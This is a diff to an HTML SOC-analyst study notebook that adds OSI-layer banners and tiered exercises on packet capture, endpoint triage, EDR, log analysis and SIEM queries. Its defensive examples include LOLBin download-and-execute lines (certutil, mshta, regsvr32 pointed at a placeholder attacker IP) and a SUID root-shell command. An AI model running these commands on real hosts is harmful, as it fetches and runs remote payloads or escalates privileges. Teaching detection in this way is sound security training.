@@ -81,6 +81,13 @@ window.NOTEBOOK = {
 <template id="tpl-01-soc-fundamentals">
 <article class="topic">
 <h1>01 · Security Operations Fundamentals</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l4">L4 Transport</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">SOC fundamentals span the full stack — common ports are L4 (TCP/UDP), protocols are L7 (HTTP, DNS, SMTP), and the Kill Chain tracks attacker movement across L3–L7.</span>
+</div>
 <hr class="divider">
 <h2>SOC Analyst Tiers</h2>
 <div class="table-wrap"><table>
@@ -141,12 +148,71 @@ window.NOTEBOOK = {
     <tr><td>31337</td><td>Elite</td><td>Classic hacker port — leet speak</td></tr>
   </tbody>
 </table></div>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Core Concepts</summary>
+  <div class="tier-body">
+    <h4>SOC Foundations &amp; OSI Mapping</h4>
+    <ul>
+      <li><strong>CIA Triad</strong>: Confidentiality (encryption at L6/L7), Integrity (checksums at L3/L4), Availability (DDoS = L3/L4 flood)</li>
+      <li><strong>Tier 1 daily workflow</strong>: Monitor alerts → triage → escalate → document</li>
+      <li><strong>Port = L4 identifier</strong>: Every service runs on a port; knowing default ports instantly tells you the L7 protocol</li>
+      <li>Kill Chain phases 1–3 (Recon/Weapon/Delivery) happen at L3/L4/L7 before any endpoint contact</li>
+    </ul>
+    <pre><code><span class="cm"># Mental model: port 443 = L4 destination port, HTTPS = L7 protocol</span>
+<span class="cm"># Port 22 = SSH (L4:22 → L7:SSH)</span>
+<span class="cm"># Port 3389 = RDP (L4:3389 → L7:RDP)</span>
+<span class="cm"># Port 4444 = common Metasploit default reverse shell (L4:4444 → L7:Meterpreter)</span></code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — Port + Protocol Fluency</summary>
+  <div class="tier-body">
+    <h4>Rapid L4/L7 Mapping</h4>
+    <ul>
+      <li>Memorize ALL ports in the common ports table — in SOC you must recognize them instantly</li>
+      <li>DNS (53/UDP): L7 tunneling target — attackers encode data in DNS queries to bypass L4 firewall rules</li>
+      <li>SMTP (25): common phishing vector; 587 = submission port used by mail clients</li>
+      <li>IOC types by layer: IP address = L3, port = L4, domain/hash/URL = L7</li>
+    </ul>
+    <pre><code><span class="cm"># Quick triage: identify the OSI layer of any IOC</span>
+192.168.56.10          → L3 Network (IP address)
+TCP port 4444          → L4 Transport (destination port)
+malware.exe hash       → L7 Application (file artifact)
+evil.c2domain.com      → L7 Application (DNS name)
+/uploads/shell.php     → L7 Application (URL path)</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Kill Chain × OSI Correlation</summary>
+  <div class="tier-body">
+    <h4>Map Every Kill Chain Phase to OSI Layers</h4>
+    <ul>
+      <li>Reconnaissance: L3 ping sweeps, L4 port scans, L7 OSINT/web scraping</li>
+      <li>Delivery: L7 (phishing email / malicious URL / macro in document)</li>
+      <li>C2 Installation: L3/L4 outbound beacon to attacker IP:port; L7 HTTP/HTTPS/DNS for C2 channel</li>
+      <li>Actions on Objectives: L7 data exfiltration (HTTP POST, DNS tunnel, SMTP)</li>
+    </ul>
+    <pre><code><span class="cm"># Kill Chain phase → OSI layer → Detection tool</span>
+Recon       → L3/L4  → Firewall logs, Zeek conn.log
+Delivery    → L7     → Email gateway, web proxy, Suricata HTTP rules
+C2          → L3/L4/L7 → Suricata, Zeek dns.log, firewall blocks
+Exfil       → L7     → Proxy logs, DLP, DNS anomaly detection</code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-02-phishing">
 <article class="topic">
 <h1>02 · Phishing Analysis</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">Phishing operates entirely at L7 Application — the attack vector is email (SMTP/L7), the lure is a web page (HTTP/HTTPS/L7), and the payload delivery is an application-layer document or URL.</span>
+</div>
 <hr class="divider">
 <h2>Social Engineering Tactics</h2>
 <div class="table-wrap"><table>
@@ -233,12 +299,76 @@ file suspicious_attachment</code></pre>
     <tr><td>Malicious Delivery</td><td>Install malware</td><td>Malicious attachments, drive-by downloads</td></tr>
   </tbody>
 </table></div>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Spotting Phishing Red Flags</summary>
+  <div class="tier-body">
+    <h4>What to Check First (L7 Application Layer)</h4>
+    <ul>
+      <li>Sender domain ≠ display name: <code>security@paypa1.com</code> vs "PayPal Security"</li>
+      <li>Check Return-Path and X-Originating-IP headers — L3 source IP exposes real origin</li>
+      <li>URL hovering: displayed text ≠ actual href (inspect the L7 destination URL)</li>
+      <li>Urgency + authority = primary social engineering combo</li>
+    </ul>
+    <pre><code><span class="cm"># Check email headers: From, Return-Path, Received, Authentication-Results</span>
+<span class="cm"># X-Originating-IP reveals L3 source IP of sending mail server</span>
+<span class="cm"># SPF: checks if L3 sending IP is authorized for the domain</span>
+<span class="cm"># DKIM: cryptographic L7 signature on email body</span>
+<span class="cm"># DMARC: policy rule — what to do when SPF/DKIM fail</span></code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — URL &amp; Attachment Analysis</summary>
+  <div class="tier-body">
+    <h4>Safe Analysis Workflow</h4>
+    <ul>
+      <li>Never click — always analyze in a sandboxed environment or via API</li>
+      <li>URLScan.io: submits L7 URL to a headless browser, returns screenshot + L3/L4/L7 network activity</li>
+      <li>VirusTotal: hash the attachment → check L7 malware family detection across 70+ AV engines</li>
+      <li>AbuseIPDB: enrich the L3 source IP from email headers</li>
+    </ul>
+    <pre><code><span class="cm"># Phishing triage workflow</span>
+1. Extract: From, Return-Path, Reply-To, X-Originating-IP
+2. Check SPF/DKIM/DMARC authentication results
+3. Defang URLs: hxxps://evil[.]com/payload
+4. VirusTotal: hash the attachment (SHA256)
+5. URLScan.io: scan landing page (L7)
+6. AbuseIPDB: check originating IP (L3)</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Campaign Attribution</summary>
+  <div class="tier-body">
+    <h4>Linking Phishing to Threat Actors</h4>
+    <ul>
+      <li>Track L3 infrastructure: IPs hosting phishing pages often reuse ASN/hosting providers</li>
+      <li>Correlate L7 patterns: same HTML template, same redirect chain, same domain registration pattern</li>
+      <li>PhishTool enriches full campaign mapping: attacker L3 IPs, L7 URLs, lure themes, targets</li>
+      <li>MITRE ATT&CK T1566: Phishing sub-techniques for spearphishing link, attachment, service</li>
+    </ul>
+    <pre><code><span class="cm"># Advanced: extract all IoCs from a phishing email</span>
+<span class="cm"># L3 IoCs: IP addresses in Received headers, X-Originating-IP</span>
+<span class="cm"># L7 IoCs: domains in URLs, file hashes of attachments</span>
+<span class="cm"># Cross-reference: check if C2 IP appeared in MISP or threat feeds</span>
+<span class="cm"># Timeline: correlate with other alerts — same IP/domain hit other users?</span></code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-03-nsm">
 <article class="topic">
 <h1>03 · Network Security Monitoring (NSM)</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l2">L2 Data Link</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l4">L4 Transport</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">NSM captures the full packet — L2 Ethernet frames, L3 IP headers (src/dst), L4 TCP/UDP segments (ports, flags), and L7 application payloads (HTTP, DNS, SMTP content).</span>
+</div>
 <hr class="divider">
 <h2>Packet / Frame Structure</h2>
 <p>Every packet travels through layers — <strong>FRAME → IP → TCP → DATA</strong></p>
@@ -300,12 +430,76 @@ sudo tcpdump -i eth0 -c 100
 sudo tcpdump -i eth0 port 80 or port 443
 <span class="cm"># Don't resolve hostnames (faster)</span>
 sudo tcpdump -i eth0 -n</code></pre>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Reading Packets &amp; tcpdump Basics</summary>
+  <div class="tier-body">
+    <h4>Every Packet Has a Stack of Headers</h4>
+    <ul>
+      <li><strong>L2 Ethernet frame</strong>: src/dst MAC address (hardware identity)</li>
+      <li><strong>L3 IP header</strong>: src/dst IP address (logical network identity)</li>
+      <li><strong>L4 TCP/UDP header</strong>: src/dst port, flags (SYN, ACK, FIN, RST)</li>
+      <li><strong>L7 payload</strong>: actual application data (HTTP request, DNS query, etc.)</li>
+    </ul>
+    <pre><code><span class="cm"># Capture on eth0, show first 100 packets without resolving names</span>
+sudo tcpdump -i eth0 -c 100 -n
+<span class="cm"># Filter by L3 host</span>
+sudo tcpdump -i eth0 -n host 192.168.56.30
+<span class="cm"># Filter by L4 port (captures L7 HTTP traffic)</span>
+sudo tcpdump -i eth0 -n port 80 or port 443</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — Targeted Capture Filters</summary>
+  <div class="tier-body">
+    <h4>Combining L3 + L4 Filters</h4>
+    <ul>
+      <li>BPF (Berkeley Packet Filter) filters run at kernel level — much faster than display filters</li>
+      <li>Combine L3 and L4 filters to isolate specific traffic: <code>host AND port</code></li>
+      <li><code>-w</code> saves to PCAP for Wireshark analysis; <code>-r</code> reads saved PCAP</li>
+    </ul>
+    <pre><code><span class="cm"># L3 src + L4 destination port (attacker scanning victim)</span>
+sudo tcpdump -i eth0 -n src 192.168.56.10 and dst port 445
+<span class="cm"># Capture DNS (L7 over L4 UDP 53)</span>
+sudo tcpdump -i eth0 -n port 53
+<span class="cm"># Save to file for Wireshark analysis</span>
+sudo tcpdump -i eth0 -n -w /tmp/capture.pcap
+<span class="cm"># Read saved capture</span>
+sudo tcpdump -r /tmp/capture.pcap -n</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Full NSM Workflow</summary>
+  <div class="tier-body">
+    <h4>NSM Investigation Process</h4>
+    <ul>
+      <li>Security Onion integrates Zeek (deep L2-L7 analysis), Suricata (L3/L4/L7 IDS), and PCAP in one platform</li>
+      <li>Workflow: Suricata alert (L3 src IP + L7 rule signature) → Zeek logs (L4 flow context) → PCAP (full L2 evidence)</li>
+      <li>IDS signature hits tell you the rule fired; PCAP lets you verify the actual L7 payload</li>
+    </ul>
+    <pre><code><span class="cm"># NSM pivot: from alert to full evidence chain</span>
+1. Suricata alert: rule fired, src IP 192.168.56.10 (L3), dst port 445 (L4)
+2. Zeek conn.log: connection duration, bytes transferred (L3/L4 flow)
+3. Wireshark: open PCAP, filter: ip.addr==192.168.56.10 &amp;&amp; tcp.port==445
+4. Follow TCP Stream: read L7 SMB payload to confirm exploit attempt</code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-04-wireshark">
 <article class="topic">
 <h1>04 · Network Traffic Analysis — Wireshark &amp; tcpdump</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l2">L2 Data Link</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l4">L4 Transport</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">Wireshark and tcpdump decode every layer from raw L2 frames to L7 application payloads. Filters select specific layers: eth (L2), ip (L3), tcp/udp (L4), http/dns (L7).</span>
+</div>
 <hr class="divider">
 <h2>Wireshark Display Filters</h2>
 <div class="table-wrap"><table>
@@ -344,12 +538,73 @@ sudo tcpdump -i eth0 -n</code></pre>
   <li>Export HTTP objects if files were transferred</li>
   <li>Hash any extracted files for VirusTotal lookup</li>
 </ol>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Wireshark Display Filters by Layer</summary>
+  <div class="tier-body">
+    <h4>Select the Right Layer for Your Investigation</h4>
+    <ul>
+      <li><strong>L2 filter</strong>: <code>eth.src == aa:bb:cc:dd:ee:ff</code> (track by MAC)</li>
+      <li><strong>L3 filter</strong>: <code>ip.addr == 192.168.56.10</code> (track by IP)</li>
+      <li><strong>L4 filter</strong>: <code>tcp.port == 4444</code> or <code>udp.port == 53</code></li>
+      <li><strong>L7 filter</strong>: <code>http</code>, <code>dns</code>, <code>smtp</code> (protocol keyword)</li>
+    </ul>
+    <pre><code><span class="cm"># L3 — show all traffic to/from victim</span>
+ip.addr == 192.168.56.30
+<span class="cm"># L4 — show SYN scan packets (no ACK)</span>
+tcp.flags.syn == 1 and tcp.flags.ack == 0
+<span class="cm"># L7 — show only HTTP requests</span>
+http.request</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — Protocol Analysis &amp; Stream Following</summary>
+  <div class="tier-body">
+    <h4>Reconstruct L7 Application Conversations</h4>
+    <ul>
+      <li>Statistics → Protocol Hierarchy: see the L7 protocol breakdown of the entire PCAP</li>
+      <li>Statistics → Conversations: rank talkers by L3 IP pairs and L4 port pairs</li>
+      <li>Right-click a TCP packet → Follow TCP Stream: reconstructs L7 application dialogue</li>
+      <li>File → Export Objects → HTTP: extracts transferred files (malware, documents)</li>
+    </ul>
+    <pre><code><span class="cm"># Triage workflow: top talkers → suspicious L7 protocol → follow stream</span>
+1. Statistics > Conversations > TCP tab → sort by bytes
+2. Identify unusual L3 destination IPs
+3. Filter: ip.addr == [suspicious IP]
+4. Right-click packet → Follow TCP Stream
+5. Read L7 content — look for shell commands, credential theft, exfil</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — tshark CLI &amp; PCAP Automation</summary>
+  <div class="tier-body">
+    <h4>tshark for Scripted L3/L4/L7 Analysis</h4>
+    <ul>
+      <li>tshark (Wireshark CLI) enables automated PCAP processing in bash scripts or pipelines</li>
+      <li>Extract specific fields from all packets using <code>-T fields -e field.name</code></li>
+      <li>Combine with grep/sort/uniq for rapid statistical analysis of large PCAPs</li>
+    </ul>
+    <pre><code><span class="cm"># Extract all L3 destination IPs from PCAP</span>
+tshark -r capture.pcap -T fields -e ip.dst | sort | uniq -c | sort -rn | head 20
+<span class="cm"># Extract L7 HTTP hosts (C2 domain hunting)</span>
+tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort -u
+<span class="cm"># Extract L4 destination ports (find unusual L4 usage)</span>
+tshark -r capture.pcap -T fields -e tcp.dstport | sort | uniq -c | sort -rn</code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-05-endpoint">
 <article class="topic">
 <h1>05 · Endpoint Security Monitoring</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">Endpoint monitoring operates at L7 — it tracks application-layer artifacts: processes, files, registry keys, user accounts, and SUID binaries. Network connections from endpoints add L3/L4 context when combined with NSM.</span>
+</div>
 <hr class="divider">
 <h2>Linux Endpoint Triage — Full Command Reference</h2>
 <pre><code><span class="cm"># List all running processes</span>
@@ -420,12 +675,76 @@ sys_check . -exec /bin/sh -p \; -quit
 <span class="cm"># Verify you escalated to root</span>
 whoami</code></pre>
 <p><strong>SUID</strong> = Set User ID. If a binary has SUID and is owned by root, running it gives root privileges. Check <code>gtfobins.github.io</code> for exploitable binaries.</p>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Linux Endpoint Triage Commands</summary>
+  <div class="tier-body">
+    <h4>Where to Look First (L7 Application Layer)</h4>
+    <ul>
+      <li>Processes = L7 application execution; <code>ps aux</code> reveals what's running right now</li>
+      <li>Network connections link L7 processes to L3/L4 endpoints — <code>ss -tulnp</code> or <code>netstat</code></li>
+      <li>Cron jobs = common persistence mechanism (L7); check all crontab locations</li>
+    </ul>
+    <pre><code><span class="cm"># L7: running processes</span>
+ps aux --sort=-%cpu | head 20
+<span class="cm"># L3/L4: what is each process connecting to?</span>
+ss -tulnp
+netstat -tulnp
+<span class="cm"># L7: unusual files in common malware drop zones</span>
+ls -la /tmp /var/tmp /dev/shm</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — Persistence &amp; Privilege Escalation Hunting</summary>
+  <div class="tier-body">
+    <h4>Attacker Favorite L7 Techniques</h4>
+    <ul>
+      <li>Cron, systemd services, SSH authorized_keys = most common Linux persistence methods</li>
+      <li>SUID binaries exploitable via GTFOBins = L7 privilege escalation bypassing kernel protections</li>
+      <li>Check <code>/proc/[PID]/</code> for deleted malware still running in memory</li>
+    </ul>
+    <pre><code><span class="cm"># L7: find persistence mechanisms</span>
+crontab -l ; ls /etc/cron* ; cat /etc/crontab
+cat ~/.ssh/authorized_keys
+systemctl list-units --type=service --state=running
+<span class="cm"># L7: running binary deleted from disk (malware technique)</span>
+ls -la /proc/*/exe 2>/dev/null | grep deleted
+<span class="cm"># L7: find all SUID binaries</span>
+find / -perm -4000 -type f 2>/dev/null</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Memory &amp; Full System Forensics</summary>
+  <div class="tier-body">
+    <h4>Live System + Post-Compromise Analysis</h4>
+    <ul>
+      <li>Collect in order of volatility: RAM → network connections → running processes → disk</li>
+      <li>LKM rootkits hide processes from <code>ps</code>/<code>ss</code> — compare /proc directly to find discrepancies</li>
+      <li>Hash all suspicious binaries before any remediation — court-admissible evidence requires hash verification</li>
+    </ul>
+    <pre><code><span class="cm"># Volatile evidence collection (L3/L4/L7)</span>
+date; uptime; who; last -20
+ip addr; ip route; arp -n       <span class="cm"># L3: current network config</span>
+ss -tulnp                        <span class="cm"># L4: open ports + L7 process owners</span>
+ps auxf                          <span class="cm"># L7: process tree</span>
+lsof -i                          <span class="cm"># L3/L4/L7: open files + network sockets</span>
+<span class="cm"># Hash suspicious file before touching</span>
+sha256sum /tmp/suspicious_binary</code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-06-edr">
 <article class="topic">
 <h1>06 · Endpoint Detection &amp; Response (EDR)</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">EDR platforms monitor L7 application behavior — process execution chains, file modifications, and registry changes. Network-based EDR signals (C2 detection) add L3/L4 context for IP and port-level threat correlation.</span>
+</div>
 <hr class="divider">
 <h2>Common EDR Platforms</h2>
 <div class="table-wrap"><table>
@@ -461,12 +780,76 @@ whoami</code></pre>
     <tr><td>lsass.exe accessed by unusual process</td><td>Credential dumping attempt</td></tr>
   </tbody>
 </table></div>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Reading EDR Alerts</summary>
+  <div class="tier-body">
+    <h4>What EDR Tells You (L7 Process Chain)</h4>
+    <ul>
+      <li>EDR tracks the <strong>L7 process execution chain</strong>: parent → child → grandchild processes</li>
+      <li>Most important suspicious pattern: <code>WINWORD.EXE → cmd.exe → powershell.exe</code> (macro dropping shell)</li>
+      <li>Process connecting to L3/L4 port 4444 = reverse shell — check network tab of EDR alert</li>
+      <li>L7 file writes to C:\Users\*\AppData or C:\Windows\Temp = malware staging area</li>
+    </ul>
+    <pre><code><span class="cm"># Suspicious process chains to memorize</span>
+Word/Excel → cmd.exe         → L7 macro execution
+Word/Excel → powershell.exe  → L7 encoded payload delivery
+cmd.exe    → net.exe         → L7 account/group manipulation
+any.exe    → connects L3:L4  → beaconing to C2</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — EDR Platform Investigation</summary>
+  <div class="tier-body">
+    <h4>Deep-Dive Process + Network Correlation</h4>
+    <ul>
+      <li>Cross-reference L7 process hash with VirusTotal before concluding it's malicious</li>
+      <li>EDR network telemetry shows L3 dst IP and L4 dst port for every process — use this to find C2</li>
+      <li>Behavioral rules trigger on L7 action sequences, not just file hashes — helps with fileless malware</li>
+    </ul>
+    <pre><code><span class="cm"># EDR investigation checklist</span>
+1. Process: parent → child chain, command line arguments
+2. File: hash → VT lookup; write path (unusual dir = red flag)
+3. Network: L3 dst IP → threat intel; L4 dst port → what protocol?
+4. Registry: persistence keys (Run, RunOnce, services)
+5. Timeline: first seen vs last seen — how long was this running?</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Threat Hunting with EDR Telemetry</summary>
+  <div class="tier-body">
+    <h4>Proactive L7 Behavioral Hunting</h4>
+    <ul>
+      <li>Hunt for living-off-the-land binaries (LOLBins): <code>certutil -urlcache -f</code>, <code>mshta.exe</code>, <code>regsvr32.exe</code> making L3 network connections</li>
+      <li>PowerShell with <code>-enc</code> flag: decode the base64 payload and check for L7 download cradles or C2 callbacks</li>
+      <li>Lateral movement: <code>psexec.exe</code>, <code>wmiexec</code>, <code>mmc.exe</code> spawning remote shells across L3 to other hosts</li>
+    </ul>
+    <pre><code><span class="cm"># LOLBin hunting (L7 living-off-the-land + L3 network activity)</span>
+certutil.exe -urlcache -f http://[L3 attacker IP]/malware.exe payload.exe
+mshta.exe http://[L3 IP]/payload.hta
+regsvr32.exe /s /n /u /i:http://[L3 IP]/file.sct scrobj.dll
+
+<span class="cm"># PowerShell encoded command decode</span>
+<span class="cm"># EDR flags: powershell.exe -enc [base64blob]</span>
+<span class="cm"># Decode in PowerShell:</span>
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('base64blob'))</code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-07-log-analysis">
 <article class="topic">
 <h1>07 · Log Analysis &amp; Management</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l4">L4 Transport</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">Log analysis extracts L3 IP addresses, L4 port numbers, and L7 application events from log files. Web logs reveal L7 SQL injection attempts; auth logs expose L3 source IPs for brute force attacks.</span>
+</div>
 <hr class="divider">
 <h2>Core Log Analysis Commands</h2>
 <pre><code><span class="cm"># Count total lines in log</span>
@@ -539,12 +922,74 @@ awk '{print $9}' access.log | sort | uniq -c | sort -rn</code></pre>
     <tr><td>(different response byte count!)</td><td>SUCCESS — different data returned = injection worked</td></tr>
   </tbody>
 </table></div>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Core Log Commands &amp; Web Log Reading</summary>
+  <div class="tier-body">
+    <h4>Log Fields Map to OSI Layers</h4>
+    <ul>
+      <li>Apache/Nginx logs: L3 source IP (client_ip), L4 dest port (80/443), L7 HTTP request/response</li>
+      <li>Auth logs: L3 source IP of SSH/RDP attempt, L7 username/outcome</li>
+      <li><code>grep</code> by L3 IP to isolate all activity from one attacker</li>
+    </ul>
+    <pre><code><span class="cm"># Count lines, grep for patterns</span>
+wc -l /var/log/auth.log
+grep "Failed password" /var/log/auth.log | tail -50
+<span class="cm"># Extract L3 source IPs of failed SSH attempts</span>
+grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
+<span class="cm"># Watch live log (tail -f = real-time)</span>
+tail -f /var/log/apache2/access.log</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — awk/grep Log Parsing</summary>
+  <div class="tier-body">
+    <h4>Extract L3/L4/L7 Fields from Logs</h4>
+    <ul>
+      <li>Apache logs are space-separated: field 1 = L3 client IP, field 7 = L7 request URL</li>
+      <li>Sort + uniq -c gives you frequency analysis — find top attackers (L3 IP) and targeted paths (L7 URL)</li>
+      <li>Look for L7 SQL injection patterns: <code>%27</code>, <code>UNION SELECT</code>, <code>--</code> in URL parameters</li>
+    </ul>
+    <pre><code><span class="cm"># Top 10 IPs by request count (L3 analysis)</span>
+awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head 10
+<span class="cm"># Find L7 SQL injection attempts</span>
+grep -i "union\|select\|%27\|1=1" /var/log/apache2/access.log
+<span class="cm"># Show only 4xx errors (L7 client errors)</span>
+awk '$9 ~ /^4/' /var/log/apache2/access.log | awk '{print $1, $7, $9}'</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Log Correlation &amp; Timeline Building</summary>
+  <div class="tier-body">
+    <h4>Multi-Source Log Correlation</h4>
+    <ul>
+      <li>Correlate by L3 IP across multiple log sources: same attacker IP in web log, auth log, and firewall log</li>
+      <li>Reconstruct attack timeline: timestamp-sorted events from Apache + auth + syslog</li>
+      <li>Detect SQL injection success by byte count change in response (same URL, different Content-Length)</li>
+    </ul>
+    <pre><code><span class="cm"># Extract L7 SQLi success: find URLs with unusual response byte sizes</span>
+awk '{print $7, $10}' /var/log/apache2/access.log | grep "consulting" | sort -k2 -n
+<span class="cm"># Pivot: all events from attacker L3 IP across log sources</span>
+grep "192.168.56.10" /var/log/apache2/access.log /var/log/auth.log /var/log/syslog
+<span class="cm"># Timeline: sort all events by timestamp</span>
+grep "192.168.56.10" /var/log/* | sort -t: -k2 | head 50</code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-08-siem">
 <article class="topic">
 <h1>08 · SIEM</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l4">L4 Transport</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">A SIEM aggregates logs from all OSI layers — network flows (L3/L4) and application events (L7) — then correlates them with rules and queries to detect threats that span multiple layers.</span>
+</div>
 <hr class="divider">
 <h2>What a SIEM Does</h2>
 <ul>
@@ -597,12 +1042,77 @@ event.action : "logon-failed" AND source.ip : "10.0.0.*"
 process.name : "power*"
 <span class="cm"># Port check</span>
 destination.port : 4444</code></pre>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — SIEM Concepts &amp; Basic Queries</summary>
+  <div class="tier-body">
+    <h4>What a SIEM Does Across OSI Layers</h4>
+    <ul>
+      <li>SIEM ingests logs from all layers: L3/L4 firewall logs, L7 Windows/Linux/web application logs</li>
+      <li>Normalization maps different log formats to the same field names (ECS in Elastic, CIM in Splunk)</li>
+      <li>A correlation rule: "if L3 src IP generates &gt;10 L7 failed login events in 5 min → alert"</li>
+    </ul>
+    <pre><code><span class="cm"># Splunk SPL: find brute force (L3 src_ip → L7 failed login)</span>
+index=main "Failed password" | stats count by src_ip | sort -count
+<span class="cm"># Elastic KQL: same query</span>
+event.action : "logon-failed" AND source.ip : *
+<span class="cm"># Elastic KQL: C2 callback (L4 suspicious port)</span>
+destination.port : 4444</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — SPL &amp; KQL for L3/L4/L7 Hunting</summary>
+  <div class="tier-body">
+    <h4>Write Queries That Span All OSI Layers</h4>
+    <ul>
+      <li>Splunk: <code>stats count by src_ip</code> = L3 aggregation; <code>process_name</code> = L7 field</li>
+      <li>Elastic KQL: <code>source.ip</code> = L3; <code>destination.port</code> = L4; <code>process.name</code> = L7</li>
+      <li>SIEM alerts can fire on any single layer OR on correlated cross-layer patterns (most valuable)</li>
+    </ul>
+    <pre><code><span class="cm"># Splunk: top source IPs (L3) for failed logins (L7 event)</span>
+index=main event_code=4625 | top limit=10 src_ip
+<span class="cm"># Elastic KQL: L7 process + L3/L4 network</span>
+process.name : "powershell.exe" AND destination.port : 4444
+<span class="cm"># Elastic KQL: wildcard process name (LOLBin hunting)</span>
+process.name : "certutil*" AND network.direction : outbound</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Correlation Rules &amp; Threat Hunting</summary>
+  <div class="tier-body">
+    <h4>Cross-Layer SIEM Correlation</h4>
+    <ul>
+      <li>Best SIEM detections correlate L3 (who) + L4 (how) + L7 (what) within a time window</li>
+      <li>Create threshold alerts that fire when an L3 IP triggers an L7 action N times in X minutes</li>
+      <li>EQL sequences in Elastic: link L7 auth success → L7 account creation = post-access persistence pattern</li>
+    </ul>
+    <pre><code><span class="cm"># Splunk: correlate brute force (L3) → success (L7) same src_ip</span>
+index=main (event_code=4625 OR event_code=4624)
+| stats count(eval(event_code=4625)) as failures,
+         count(eval(event_code=4624)) as successes by src_ip
+| where failures > 5 AND successes > 0
+| sort -failures
+<span class="cm"># Elastic EQL: access followed by account creation (L7 chain)</span>
+sequence by host.name with maxspan=5m
+  [authentication where event.code == "4624"]
+  [iam where event.code == "4720"]</code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-09-threat-intel">
 <article class="topic">
 <h1>09 · Threat Intelligence</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l4">L4 Transport</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">Threat intelligence IoCs span all layers: L3 IP addresses and CIDR ranges, L4 malicious ports, and L7 domains/URLs/file hashes. MITRE ATT&amp;CK TTPs describe how attackers traverse L3→L7 in their campaigns.</span>
+</div>
 <hr class="divider">
 <h2>Key Concepts</h2>
 <div class="table-wrap"><table>
@@ -647,12 +1157,68 @@ destination.port : 4444</code></pre>
     <tr><td>Command &amp; Control</td><td>Web Protocols (T1071.001), Proxy (T1090)</td></tr>
   </tbody>
 </table></div>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
